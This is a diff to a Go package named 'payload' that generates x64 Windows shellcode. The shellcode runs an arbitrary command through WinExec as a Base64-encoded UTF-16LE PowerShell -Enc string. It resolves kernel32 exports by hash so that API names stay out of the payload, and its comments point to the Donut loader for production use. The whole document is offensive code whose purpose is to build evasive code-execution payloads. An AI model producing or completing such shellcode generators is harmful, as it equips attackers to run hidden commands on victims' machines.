@@ -1,8 +1,11 @@
 package payload
 
 import (
+	"bytes"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
+	"unicode/utf16"
 )
 
 // buildPowershellWinExecShellcode generates x64 shellcode that:
@@ -136,9 +139,9 @@ func buildPowershellWinExecShellcodeX64(encodedCmd string) []byte {
 	return sc
 }
 
-// resolveExportShellcode generates shellcode that resolves a function from kernel32.
-// Input: rbx = kernel32 base address, function name at label
-// Output: rax = function address
+// resolveExportShellcode attempts to resolve API functions by hash walking the PE export table.
+// NOTE: This is currently incomplete and falls through to buildHashExportShellcode.
+// TODO: Complete the Jenkins hash computation for proper API resolution.
 func resolveExportShellcode(existing []byte, funcName string) []byte {
 	// For simplicity, we embed the function name hash (Jenkins one-at-a-time)
 	// and use position-independent export walking
@@ -171,8 +174,9 @@ func resolveExportShellcode(existing []byte, funcName string) []byte {
 	return buildHashExportShellcode(funcName)
 }
 
-// buildHashExportShellcode generates shellcode that resolves exports by hash.
-// This avoids embedding function names in the shellcode.
+// buildHashExportShellcode generates shellcode that resolves kernel32 exports via hash walking.
+// NOTE: This implementation is incomplete — the Jenkins hash loop is unfinished.
+// For production use, prefer the Donut loader which handles .NET assemblies correctly.
 func buildHashExportShellcode(funcName string) []byte {
 	hash := jenkinsHash(funcName)
 
@@ -278,17 +282,30 @@ func jenkinsHash(s string) uint32 {
 	return hash
 }
 
+// utf16leEncode encodes a string to UTF-16LE bytes (used by PowerShell -Enc).
+func utf16leEncode(s string) []byte {
+	var buf bytes.Buffer
+	for _, r := range s {
+		for _, w := range utf16.Encode([]rune{r}) {
+			_ = binary.Write(&buf, binary.LittleEndian, w)
+		}
+	}
+	return buf.Bytes()
+}
+
 // GenerateBasicShellcode creates minimal x64 shellcode that runs a command via WinExec.
 // This is a fallback when donut CLI isn't available.
 func GenerateBasicShellcode(cmd string) ([]byte, error) {
 	if cmd == "" {
 		return nil, fmt.Errorf("empty command")
 	}
-	// Max safe command length
+	// Max safe command length (after UTF-16LE encoding this doubles)
 	if len(cmd) > 4096 {
 		cmd = cmd[:4096]
 	}
-	return buildPowershellWinExecShellcodeX64(cmd), nil
+	// Base64-encode the UTF-16LE command for PowerShell -Enc flag
+	encodedCmd := base64.StdEncoding.EncodeToString(utf16leEncode(cmd))
+	return buildPowershellWinExecShellcodeX64(encodedCmd), nil
 }
 
 
